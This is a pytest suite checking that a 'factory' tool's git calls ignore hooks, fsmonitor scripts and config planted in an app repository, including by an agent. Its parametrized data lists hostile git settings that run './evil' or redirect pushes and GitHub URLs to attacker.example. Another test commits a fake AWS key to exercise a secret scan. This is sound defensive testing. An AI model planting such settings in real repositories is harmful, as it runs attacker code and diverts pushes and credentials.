"""Host-side git never runs what an app's .git (or the operator's config) carries (audit A1, A58, A152).

Each attack test first shows, with plain git, that the planted setting really runs a program; then that the
factory's git calls do not run it, or refuse the app."""

import os
import shutil
import subprocess
from pathlib import Path

import pytest

from factory import project
from factory.gates import secrets_in_history
from factory.project import (
    ProjectError,
    check_git_dir,
    commit_all,
    porcelain,
    prepare_project,
    push_branch,
    run_git,
)

REPO = Path(__file__).resolve().parents[1]


def plain_git(app, *args, env=None):
    return subprocess.run(["git", *args], cwd=app, capture_output=True, text=True, encoding="utf-8", env=env)


@pytest.fixture
def app(tmp_path):
    dest = tmp_path / "app"
    shutil.copytree(REPO / "golden_paths" / "python-fastapi", dest)
    prepare_project(dest)
    return dest


def marker_script(path: Path, marker: Path) -> None:
    path.write_text(f'#!/bin/sh\necho ran > "{marker.as_posix()}"\n', encoding="utf-8", newline="\n")
    path.chmod(0o755)


def test_a_hook_the_agent_planted_never_runs_on_a_factory_commit(app, tmp_path):
    marker = tmp_path / "hook-ran"
    marker_script(app / ".git" / "hooks" / "pre-commit", marker)
    (app / "new.txt").write_text("a\n", encoding="utf-8")
    plain_git(app, "add", "-A")
    plain_git(app, "commit", "-q", "-m", "control")
    assert marker.exists(), "control: plain git runs the planted hook"
    marker.unlink()
    (app / "other.txt").write_text("b\n", encoding="utf-8")
    assert commit_all(app, "factory commit") == ["other.txt"]
    assert not marker.exists()


def test_the_operators_own_hooks_path_and_fsmonitor_never_run_either(app, tmp_path, monkeypatch):
    hooks = tmp_path / "operator-hooks"
    hooks.mkdir()
    marker = tmp_path / "operator-hook-ran"
    marker_script(hooks / "pre-commit", marker)
    fsmonitor_marker = tmp_path / "fsmonitor-ran"
    fsmonitor = tmp_path / "fsmonitor.sh"
    marker_script(fsmonitor, fsmonitor_marker)
    glob = tmp_path / "global.gitconfig"
    glob.write_text(
        f"[core]\n\thooksPath = {hooks.as_posix()}\n\tfsmonitor = {fsmonitor.as_posix()}\n"
        "[commit]\n\tgpgsign = true\n[gpg]\n\tprogram = false\n",
        encoding="utf-8",
    )
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(glob))
    (app / "x.txt").write_text("x\n", encoding="utf-8")
    plain_git(app, "status", "--porcelain", env={**os.environ})
    assert fsmonitor_marker.exists(), "control: plain git runs the configured fsmonitor"
    fsmonitor_marker.unlink()
    assert porcelain(app) == ["x.txt"]
    assert commit_all(app, "factory commit") == ["x.txt"]  # gpg.program = false would fail a signed commit
    assert not marker.exists() and not fsmonitor_marker.exists()


@pytest.mark.parametrize(
    "setting",
    [
        "core.fsmonitor=./evil",
        "core.sshCommand=./evil",
        "core.pager=./evil",
        "filter.x.clean=./evil",
        "diff.x.textconv=./evil",
        "credential.helper=./evil",
        "remote.origin.pushurl=https://attacker.example/x.git",
        "url.https://attacker.example/.insteadOf=https://github.com/",
        "include.path=../evil.gitconfig",
        "alias.st=!./evil",
    ],
)
def test_a_planted_git_config_setting_makes_the_factory_refuse_the_app(app, setting):
    key, value = setting.split("=", 1)
    plain_git(app, "config", key, value)
    with pytest.raises(ProjectError, match="does not allow"):
        porcelain(app)


def test_the_settings_the_factory_itself_writes_are_allowed(app):
    plain_git(app, "remote", "add", "origin", "https://github.com/acme/app.git")
    plain_git(app, "config", "branch.factory/x.factory-base", "main")
    plain_git(app, "config", "branch.main.remote", "origin")
    plain_git(app, "config", "branch.main.merge", "refs/heads/main")
    check_git_dir(app)  # no error


def test_a_git_file_pointing_elsewhere_is_refused(tmp_path):
    app = tmp_path / "app"
    app.mkdir()
    (app / ".git").write_text("gitdir: /somewhere/else\n", encoding="utf-8")
    with pytest.raises(ProjectError, match="not a plain directory"):
        run_git(app, "status")


def test_an_unreadable_git_config_is_refused(app):
    (app / ".git" / "config").write_text("[core\n broken", encoding="utf-8")
    with pytest.raises(ProjectError, match="not a readable git config"):
        check_git_dir(app)


def test_a_repository_without_a_config_file_needs_no_check(tmp_path):
    (tmp_path / "app" / ".git").mkdir(parents=True)
    check_git_dir(tmp_path / "app")  # nothing to read, nothing refused


def test_the_config_is_read_again_only_when_it_changes(app, monkeypatch):
    check_git_dir(app)
    calls = []
    real = subprocess.run
    monkeypatch.setattr(project.subprocess, "run", lambda *a, **k: calls.append(a) or real(*a, **k))
    check_git_dir(app)
    assert calls == []
    plain_git(app, "config", "core.sshCommand", "./evil")
    with pytest.raises(ProjectError):
        check_git_dir(app)


def test_a_git_call_that_hangs_becomes_a_project_error(app, monkeypatch):
    check_git_dir(app)

    def hang(*a, **k):
        raise subprocess.TimeoutExpired(a[0], 1)

    monkeypatch.setattr(project.subprocess, "run", hang)
    with pytest.raises(ProjectError, match="timed out"):
        run_git(app, "status")


def test_a_push_goes_only_to_the_expected_url(app):
    plain_git(app, "remote", "add", "origin", "https://attacker.example/app.git")
    with pytest.raises(ProjectError, match="refusing to push"):
        push_branch(app, "main", "https://github.com/acme/app.git")


def test_a_gitattributes_cannot_hide_a_committed_secret_from_the_history_scan(app):
    key = "AKIA" + "ABCDEFGHIJKLMNOP"
    base = plain_git(app, "rev-parse", "HEAD").stdout.strip()
    (app / ".gitattributes").write_text("*.env -diff\n", encoding="utf-8")
    (app / "prod.env").write_text(f"KEY={key}\n", encoding="utf-8")
    commit_all(app, "add env")
    assert any("prod.env" in h for h in secrets_in_history(app, f"{base}..HEAD"))


def test_a_refused_app_turns_the_history_scan_into_a_clear_error(app):
    plain_git(app, "config", "core.sshCommand", "./evil")
    with pytest.raises(ValueError, match="does not allow"):
        secrets_in_history(app, "HEAD")
